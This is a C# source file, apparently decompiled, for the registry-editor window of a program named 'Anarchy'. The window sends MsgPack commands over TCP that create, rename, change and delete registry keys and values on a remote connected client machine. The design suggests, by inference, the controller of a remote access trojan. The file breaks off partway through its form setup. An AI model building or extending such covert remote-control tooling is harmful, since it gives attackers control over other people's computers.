using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Helpers.Helper;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using Microsoft.Win32;
using ReaLTaiizor.Forms;

namespace Anarchy.Forms;

public class FormRegistryEditor : Form
{
    private IContainer components;

    private TableLayoutPanel tableLayoutPanel;

    private SplitContainer splitContainer;

    public RegistryTreeView tvRegistryDirectory;

    private listview1 lstRegistryValues;

    private StatusStrip statusStrip;

    private ToolStripStatusLabel selectedStripStatusLabel;

    private ImageList imageRegistryDirectoryList;

    private ColumnHeader hName;

    private ColumnHeader hType;

    private ColumnHeader hValue;

    private ImageList imageRegistryKeyTypeList;

    private ContextMenuStrip tv_ContextMenuStrip;

    private ToolStripMenuItem newToolStripMenuItem;

    private ToolStripMenuItem keyToolStripMenuItem;

    private ToolStripSeparator toolStripSeparator1;

    private ToolStripMenuItem deleteToolStripMenuItem;

    private ToolStripMenuItem renameToolStripMenuItem;

    private ToolStripSeparator toolStripSeparator2;

    private ToolStripMenuItem stringValueToolStripMenuItem;

    private ToolStripMenuItem binaryValueToolStripMenuItem;

    private ToolStripMenuItem dWORD32bitValueToolStripMenuItem;

    private ToolStripMenuItem qWORD64bitValueToolStripMenuItem;

    private ToolStripMenuItem multiStringValueToolStripMenuItem;

    private ToolStripMenuItem expandableStringValueToolStripMenuItem;

    private ContextMenuStrip selectedItem_ContextMenuStrip;

    private ToolStripMenuItem modifyToolStripMenuItem;

    private ToolStripMenuItem modifyBinaryDataToolStripMenuItem;

    private ToolStripMenuItem deleteToolStripMenuItem1;

    private ToolStripMenuItem renameToolStripMenuItem1;

    private ContextMenuStrip lst_ContextMenuStrip;

    private ToolStripMenuItem newToolStripMenuItem1;

    private ToolStripMenuItem keyToolStripMenuItem1;

    private ToolStripMenuItem stringValueToolStripMenuItem1;

    private ToolStripMenuItem binaryValueToolStripMenuItem1;

    private ToolStripMenuItem dWORD32bitValueToolStripMenuItem1;

    private ToolStripMenuItem qWORD64bitValueToolStripMenuItem1;

    private ToolStripMenuItem multiStringValueToolStripMenuItem1;

    private ToolStripMenuItem expandableStringValueToolStripMenuItem1;

    private ToolStripSeparator toolStripSeparator4;

    private MenuStrip menuStrip;

    private ToolStripMenuItem fileToolStripMenuItem;

    private ToolStripMenuItem exitToolStripMenuItem;

    private ToolStripMenuItem editToolStripMenuItem;

    private ToolStripMenuItem modifyToolStripMenuItem1;

    private ToolStripMenuItem modifyBinaryDataToolStripMenuItem1;

    private ToolStripSeparator modifyNewtoolStripSeparator;

    private ToolStripMenuItem newToolStripMenuItem2;

    private ToolStripSeparator toolStripSeparator6;

    private ToolStripMenuItem deleteToolStripMenuItem2;

    private ToolStripMenuItem renameToolStripMenuItem2;

    private ToolStripMenuItem keyToolStripMenuItem2;

    private ToolStripSeparator toolStripSeparator7;

    private ToolStripMenuItem stringValueToolStripMenuItem2;

    private ToolStripMenuItem binaryValueToolStripMenuItem2;

    private ToolStripMenuItem dWORD32bitValueToolStripMenuItem2;

    private ToolStripMenuItem qWORD64bitValueToolStripMenuItem2;

    private ToolStripMenuItem multiStringValueToolStripMenuItem2;

    private ToolStripMenuItem expandableStringValueToolStripMenuItem2;

    private ToolStripSeparator modifyToolStripSeparator1;

    public System.Windows.Forms.Timer timer1;

    private HopeForm hopeForm1;

    public Form1 F { get; set; }

    internal Clients Client { get; set; }

    internal Clients ParentClient { get; set; }

    public FormRegistryEditor()
    {
        this.InitializeComponent();
    }

    private void FrmRegistryEditor_Load(object sender, EventArgs e)
    {
        MessageBox.Show("The client software is not running as administrator and therefore some functionality like Update, Create, Open and Delete may not work properly!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }

    private void AddRootKey(RegistrySeeker.RegSeekerMatch match)
    {
        TreeNode treeNode;
        treeNode = this.CreateNode(match.Key, match.Key, match.Data);
        treeNode.Nodes.Add(new TreeNode());
        this.tvRegistryDirectory.Nodes.Add(treeNode);
    }

    private TreeNode AddKeyToTree(TreeNode parent, RegistrySeeker.RegSeekerMatch subKey)
    {
        TreeNode treeNode;
        treeNode = this.CreateNode(subKey.Key, subKey.Key, subKey.Data);
        parent.Nodes.Add(treeNode);
        if (subKey.HasSubKeys)
        {
            treeNode.Nodes.Add(new TreeNode());
        }
        return treeNode;
    }

    private TreeNode CreateNode(string key, string text, object tag)
    {
        return new TreeNode
        {
            Text = text,
            Name = key,
            Tag = tag
        };
    }

    public void AddKeys(string rootKey, RegistrySeeker.RegSeekerMatch[] matches)
    {
        if (string.IsNullOrEmpty(rootKey))
        {
            this.tvRegistryDirectory.BeginUpdate();
            RegistrySeeker.RegSeekerMatch[] array;
            array = matches;
            for (int i = 0; i < array.Length; i++)
            {
                this.AddRootKey(array[i]);
            }
            this.tvRegistryDirectory.SelectedNode = this.tvRegistryDirectory.Nodes[0];
            this.tvRegistryDirectory.EndUpdate();
            return;
        }
        TreeNode treeNode;
        treeNode = this.GetTreeNode(rootKey);
        if (treeNode != null)
        {
            this.tvRegistryDirectory.BeginUpdate();
            RegistrySeeker.RegSeekerMatch[] array;
            array = matches;
            for (int i = 0; i < array.Length; i++)
            {
                this.AddKeyToTree(treeNode, array[i]);
            }
            treeNode.Expand();
            this.tvRegistryDirectory.EndUpdate();
        }
    }

    public void CreateNewKey(string rootKey, RegistrySeeker.RegSeekerMatch match)
    {
        TreeNode treeNode;
        treeNode = this.AddKeyToTree(this.GetTreeNode(rootKey), match);
        treeNode.EnsureVisible();
        this.tvRegistryDirectory.SelectedNode = treeNode;
        treeNode.Expand();
        this.tvRegistryDirectory.LabelEdit = true;
        treeNode.BeginEdit();
    }

    public void DeleteKey(string rootKey, string subKey)
    {
        TreeNode treeNode;
        treeNode = this.GetTreeNode(rootKey);
        if (treeNode.Nodes.ContainsKey(subKey))
        {
            treeNode.Nodes.RemoveByKey(subKey);
        }
    }

    public void RenameKey(string rootKey, string oldName, string newName)
    {
        TreeNode treeNode;
        treeNode = this.GetTreeNode(rootKey);
        if (treeNode.Nodes.ContainsKey(oldName))
        {
            treeNode.Nodes[oldName].Text = newName;
            treeNode.Nodes[oldName].Name = newName;
            this.tvRegistryDirectory.SelectedNode = treeNode.Nodes[newName];
        }
    }

    private TreeNode GetTreeNode(string path)
    {
        string[] array;
        array = path.Split('\\');
        TreeNode treeNode;
        treeNode = this.tvRegistryDirectory.Nodes[array[0]];
        if (treeNode == null)
        {
            return null;
        }
        int num;
        num = 1;
        while (true)
        {
            if (num < array.Length)
            {
                treeNode = treeNode.Nodes[array[num]];
                if (treeNode == null)
                {
                    break;
                }
                num++;
                continue;
            }
            return treeNode;
        }
        return null;
    }

    public void CreateValue(string keyPath, RegistrySeeker.RegValueData value)
    {
        TreeNode treeNode;
        treeNode = this.GetTreeNode(keyPath);
        if (treeNode != null)
        {
            List<RegistrySeeker.RegValueData> list;
            list = ((RegistrySeeker.RegValueData[])treeNode.Tag).ToList();
            list.Add(value);
            treeNode.Tag = list.ToArray();
            if (this.tvRegistryDirectory.SelectedNode == treeNode)
            {
                RegistryValueLstItem registryValueLstItem;
                registryValueLstItem = new RegistryValueLstItem(value);
                this.lstRegistryValues.Items.Add(registryValueLstItem);
                this.lstRegistryValues.SelectedIndices.Clear();
                registryValueLstItem.Selected = true;
                this.lstRegistryValues.LabelEdit = true;
                registryValueLstItem.BeginEdit();
            }
            this.tvRegistryDirectory.SelectedNode = treeNode;
        }
    }

    public void DeleteValue(string keyPath, string valueName)
    {
        TreeNode treeNode;
        treeNode = this.GetTreeNode(keyPath);
        if (treeNode == null)
        {
            return;
        }
        if (!RegValueHelper.IsDefaultValue(valueName))
        {
            treeNode.Tag = ((RegistrySeeker.RegValueData[])treeNode.Tag).Where((RegistrySeeker.RegValueData value) => value.Name != valueName).ToArray();
            if (this.tvRegistryDirectory.SelectedNode == treeNode)
            {
                this.lstRegistryValues.Items.RemoveByKey(valueName);
            }
        }
        else
        {
            RegistrySeeker.RegValueData regValueData;
            regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == valueName);
            if (this.tvRegistryDirectory.SelectedNode == treeNode)
            {
                RegistryValueLstItem registryValueLstItem;
                registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == valueName);
                if (registryValueLstItem != null)
                {
                    registryValueLstItem.Data = regValueData.Kind.RegistryTypeToString(null);
                }
            }
        }
        this.tvRegistryDirectory.SelectedNode = treeNode;
    }

    public void RenameValue(string keyPath, string oldName, string newName)
    {
        TreeNode treeNode;
        treeNode = this.GetTreeNode(keyPath);
        if (treeNode == null)
        {
            return;
        }
        ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == oldName).Name = newName;
        if (this.tvRegistryDirectory.SelectedNode == treeNode)
        {
            RegistryValueLstItem registryValueLstItem;
            registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == oldName);
            if (registryValueLstItem != null)
            {
                registryValueLstItem.RegName = newName;
            }
        }
        this.tvRegistryDirectory.SelectedNode = treeNode;
    }

    public void ChangeValue(string keyPath, RegistrySeeker.RegValueData value)
    {
        TreeNode treeNode;
        treeNode = this.GetTreeNode(keyPath);
        if (treeNode == null)
        {
            return;
        }
        this.ChangeRegistryValue(dest: ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == value.Name), source: value);
        if (this.tvRegistryDirectory.SelectedNode == treeNode)
        {
            RegistryValueLstItem registryValueLstItem;
            registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == value.Name);
            if (registryValueLstItem != null)
            {
                registryValueLstItem.Data = RegValueHelper.RegistryValueToString(value);
            }
        }
        this.tvRegistryDirectory.SelectedNode = treeNode;
    }

    private void ChangeRegistryValue(RegistrySeeker.RegValueData source, RegistrySeeker.RegValueData dest)
    {
        if (source.Kind == dest.Kind)
        {
            dest.Data = source.Data;
        }
    }

    private void UpdateLstRegistryValues(TreeNode node)
    {
        this.selectedStripStatusLabel.Text = node.FullPath;
        this.PopulateLstRegistryValues((RegistrySeeker.RegValueData[])node.Tag);
    }

    private void PopulateLstRegistryValues(RegistrySeeker.RegValueData[] values)
    {
        this.lstRegistryValues.BeginUpdate();
        this.lstRegistryValues.Items.Clear();
        values = values.OrderBy((RegistrySeeker.RegValueData value) => value.Name).ToArray();
        RegistrySeeker.RegValueData[] array;
        array = values;
        for (int i = 0; i < array.Length; i++)
        {
            RegistryValueLstItem value2;
            value2 = new RegistryValueLstItem(array[i]);
            this.lstRegistryValues.Items.Add(value2);
        }
        this.lstRegistryValues.EndUpdate();
    }

    private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
    {
        if (e.Label != null)
        {
            e.CancelEdit = true;
            if (e.Label.Length > 0)
            {
                if (e.Node.Parent.Nodes.ContainsKey(e.Label))
                {
                    MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    e.Node.BeginEdit();
                    return;
                }
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "RenameRegistryKey";
                msgPack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
                msgPack.ForcePathObject("NewKeyName").AsString = e.Label;
                msgPack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
                this.tvRegistryDirectory.LabelEdit = false;
            }
            else
            {
                MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                e.Node.BeginEdit();
            }
        }
        else
        {
            this.tvRegistryDirectory.LabelEdit = false;
        }
    }

    private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
    {
        TreeNode node;
        node = e.Node;
        if (string.IsNullOrEmpty(node.FirstNode.Name))
        {
            this.tvRegistryDirectory.SuspendLayout();
            node.Nodes.Clear();
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "LoadRegistryKey";
            msgPack.ForcePathObject("RootKeyName").AsString = node.FullPath;
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            Thread.Sleep(500);
            this.tvRegistryDirectory.ResumeLayout();
            e.Cancel = true;
        }
    }

    private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
    {
        if (e.Button == MouseButtons.Right)
        {
            this.tvRegistryDirectory.SelectedNode = e.Node;
            Point position;
            position = new Point(e.X, e.Y);
            this.CreateTreeViewMenuStrip();
            this.tv_ContextMenuStrip.Show(this.tvRegistryDirectory, position);
        }
    }

    private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
    {
        this.UpdateLstRegistryValues(e.Node);
    }

    private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Delete && this.GetDeleteState())
        {
            this.deleteRegistryKey_Click(this, e);
        }
    }

    private void CreateEditToolStrip()
    {
        this.modifyToolStripMenuItem1.Visible = (this.modifyBinaryDataToolStripMenuItem1.Visible = (this.modifyNewtoolStripSeparator.Visible = this.lstRegistryValues.Focused));
        this.modifyToolStripMenuItem1.Enabled = (this.modifyBinaryDataToolStripMenuItem1.Enabled = this.lstRegistryValues.SelectedItems.Count == 1);
        this.renameToolStripMenuItem2.Enabled = this.GetRenameState();
        this.deleteToolStripMenuItem2.Enabled = this.GetDeleteState();
    }

    private void CreateTreeViewMenuStrip()
    {
        this.renameToolStripMenuItem.Enabled = this.tvRegistryDirectory.SelectedNode.Parent != null;
        this.deleteToolStripMenuItem.Enabled = this.tvRegistryDirectory.SelectedNode.Parent != null;
    }

    private void CreateListViewMenuStrip()
    {
        this.modifyToolStripMenuItem.Enabled = (this.modifyBinaryDataToolStripMenuItem.Enabled = this.lstRegistryValues.SelectedItems.Count == 1);
        this.renameToolStripMenuItem1.Enabled = this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name);
        this.deleteToolStripMenuItem1.Enabled = this.tvRegistryDirectory.SelectedNode != null && this.lstRegistryValues.SelectedItems.Count > 0;
    }

    private void editToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
    {
        this.CreateEditToolStrip();
    }

    private void menuStripExit_Click(object sender, EventArgs e)
    {
        base.Close();
    }

    private void menuStripDelete_Click(object sender, EventArgs e)
    {
        if (this.tvRegistryDirectory.Focused)
        {
            this.deleteRegistryKey_Click(this, e);
        }
        else if (this.lstRegistryValues.Focused)
        {
            this.deleteRegistryValue_Click(this, e);
        }
    }

    private void menuStripRename_Click(object sender, EventArgs e)
    {
        if (this.tvRegistryDirectory.Focused)
        {
            this.renameRegistryKey_Click(this, e);
        }
        else if (this.lstRegistryValues.Focused)
        {
            this.renameRegistryValue_Click(this, e);
        }
    }

    private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Right)
        {
            Point position;
            position = new Point(e.X, e.Y);
            if (this.lstRegistryValues.GetItemAt(position.X, position.Y) == null)
            {
                this.lst_ContextMenuStrip.Show(this.lstRegistryValues, position);
                return;
            }
            this.CreateListViewMenuStrip();
            this.selectedItem_ContextMenuStrip.Show(this.lstRegistryValues, position);
        }
    }

    private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
    {
        if (e.Label != null && this.tvRegistryDirectory.SelectedNode != null)
        {
            e.CancelEdit = true;
            int item;
            item = e.Item;
            if (e.Label.Length > 0)
            {
                if (this.lstRegistryValues.Items.ContainsKey(e.Label))
                {
                    MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    this.lstRegistryValues.Items[item].BeginEdit();
                    return;
                }
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "RenameRegistryValue";
                msgPack.ForcePathObject("OldValueName").AsString = this.lstRegistryValues.Items[item].Name;
                msgPack.ForcePathObject("NewValueName").AsString = e.Label;
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
                this.lstRegistryValues.LabelEdit = false;
            }
            else
            {
                MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                this.lstRegistryValues.Items[item].BeginEdit();
            }
        }
        else
        {
            this.lstRegistryValues.LabelEdit = false;
        }
    }

    private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Delete && this.GetDeleteState())
        {
            this.deleteRegistryValue_Click(this, e);
        }
    }

    private void createNewRegistryKey_Click(object sender, EventArgs e)
    {
        if (!this.tvRegistryDirectory.SelectedNode.IsExpanded && this.tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
        {
            this.tvRegistryDirectory.AfterExpand += createRegistryKey_AfterExpand;
            this.tvRegistryDirectory.SelectedNode.Expand();
            return;
        }
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
        msgPack.ForcePathObject("Command").AsString = "CreateRegistryKey";
        msgPack.ForcePathObject("ParentPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void deleteRegistryKey_Click(object sender, EventArgs e)
    {
        if (MessageBox.Show("Are you sure you want to permanently delete this key and all of its subkeys?", "Confirm Key Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
        {
            string fullPath;
            fullPath = this.tvRegistryDirectory.SelectedNode.Parent.FullPath;
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "DeleteRegistryKey";
            msgPack.ForcePathObject("KeyName").AsString = this.tvRegistryDirectory.SelectedNode.Name;
            msgPack.ForcePathObject("ParentPath").AsString = fullPath;
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void renameRegistryKey_Click(object sender, EventArgs e)
    {
        this.tvRegistryDirectory.LabelEdit = true;
        this.tvRegistryDirectory.SelectedNode.BeginEdit();
    }

    private void createStringRegistryValue_Click(object sender, EventArgs e)
    {
        if (this.tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "1";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void createBinaryRegistryValue_Click(object sender, EventArgs e)
    {
        if (this.tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "3";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void createDwordRegistryValue_Click(object sender, EventArgs e)
    {
        if (this.tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "4";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void createQwordRegistryValue_Click(object sender, EventArgs e)
    {
        if (this.tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "11";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
    {
        if (this.tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "7";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
    {
        if (this.tvRegistryDirectory.SelectedNode != null)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
            msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
            msgPack.ForcePathObject("Kindstring").AsString = "2";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void deleteRegistryValue_Click(object sender, EventArgs e)
    {
        if (MessageBox.Show("Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + ((this.lstRegistryValues.SelectedItems.Count == 1) ? "this value?" : "these values?"), "Confirm Value Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
        {
            return;
        }
        foreach (object selectedItem in this.lstRegistryValues.SelectedItems)
        {
            if (selectedItem.GetType() == typeof(RegistryValueLstItem))
            {
                RegistryValueLstItem registryValueLstItem;
                registryValueLstItem = (RegistryValueLstItem)selectedItem;
                MsgPack msgPack;
                msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "DeleteRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("ValueName").AsString = registryValueLstItem.RegName;
                ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
            }
        }
    }

    private void renameRegistryValue_Click(object sender, EventArgs e)
    {
        this.lstRegistryValues.LabelEdit = true;
        this.lstRegistryValues.SelectedItems[0].BeginEdit();
    }

    private void modifyRegistryValue_Click(object sender, EventArgs e)
    {
        this.CreateEditForm(isBinary: false);
    }

    private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
    {
        this.CreateEditForm(isBinary: true);
    }

    private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
    {
        if (e.Node == this.tvRegistryDirectory.SelectedNode)
        {
            this.createNewRegistryKey_Click(this, e);
            this.tvRegistryDirectory.AfterExpand -= createRegistryKey_AfterExpand;
        }
    }

    private bool GetDeleteState()
    {
        if (this.lstRegistryValues.Focused)
        {
            return this.lstRegistryValues.SelectedItems.Count > 0;
        }
        if (this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null)
        {
            return this.tvRegistryDirectory.SelectedNode.Parent != null;
        }
        return false;
    }

    private bool GetRenameState()
    {
        if (this.lstRegistryValues.Focused)
        {
            if (this.lstRegistryValues.SelectedItems.Count == 1)
            {
                return !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name);
            }
            return false;
        }
        if (this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null)
        {
            return this.tvRegistryDirectory.SelectedNode.Parent != null;
        }
        return false;
    }

    private Form GetEditForm(RegistrySeeker.RegValueData value, RegistryValueKind valueKind)
    {
        switch (valueKind)
        {
            case RegistryValueKind.String:
            case RegistryValueKind.ExpandString:
                return new FormRegValueEditString(value);
            case RegistryValueKind.Binary:
                return new FormRegValueEditBinary(value);
            case RegistryValueKind.MultiString:
                return new FormRegValueEditMultiString(value);
            default:
                return null;
            case RegistryValueKind.DWord:
            case RegistryValueKind.QWord:
                return new FormRegValueEditWord(value);
        }
    }

    private void CreateEditForm(bool isBinary)
    {
        _ = this.tvRegistryDirectory.SelectedNode.FullPath;
        string name;
        name = this.lstRegistryValues.SelectedItems[0].Name;
        RegistrySeeker.RegValueData regValueData;
        regValueData = ((RegistrySeeker.RegValueData[])this.tvRegistryDirectory.SelectedNode.Tag).ToList().Find((RegistrySeeker.RegValueData item) => item.Name == name);
        using Form form = this.GetEditForm(regValueData, isBinary ? RegistryValueKind.Binary : regValueData.Kind);
        if (form.ShowDialog() == DialogResult.OK)
        {
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "ChangeRegistryValue";
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
    }

    public void timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
            {
                base.Close();
            }
        }
        catch
        {
            base.Close();
        }
    }

    private void hopeForm1_Click(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormRegistryEditor));
        this.tableLayoutPanel = new System.Windows.Forms.TableLayoutPanel();
        this.splitContainer = new System.Windows.Forms.SplitContainer();
        this.tvRegistryDirectory = new RegistryTreeView();
        this.imageRegistryDirectoryList = new System.Windows.Forms.ImageList(this.components);
        this.lstRegistryValues = new listview1();
        this.hName = new System.Windows.Forms.ColumnHeader();
        this.hType = new System.Windows.Forms.ColumnHeader();
        this.hValue = new System.Windows.Forms.ColumnHeader();
        this.imageRegistryKeyTypeList = new System.Windows.Forms.ImageList(this.components);
        this.statusStrip = new System.Windows.Forms.StatusStrip();
        this.selectedStripStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
        this.menuStrip = new System.Windows.Forms.MenuStrip();
        this.fileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.exitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.editToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.modifyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.modifyBinaryDataToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.modifyNewtoolStripSeparator = new System.Windows.Forms.ToolStripSeparator();
        this.newToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.keyToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
        this.stringValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.binaryValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.dWORD32bitValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.qWORD64bitValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.multiStringValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.expandableStringValueToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
        this.deleteToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.renameToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
        this.tv_ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.newToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.keyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
        this.stringValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.binaryValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.dWORD32bitValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.qWORD64bitValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.multiStringValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.expandableStringValueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
        this.deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
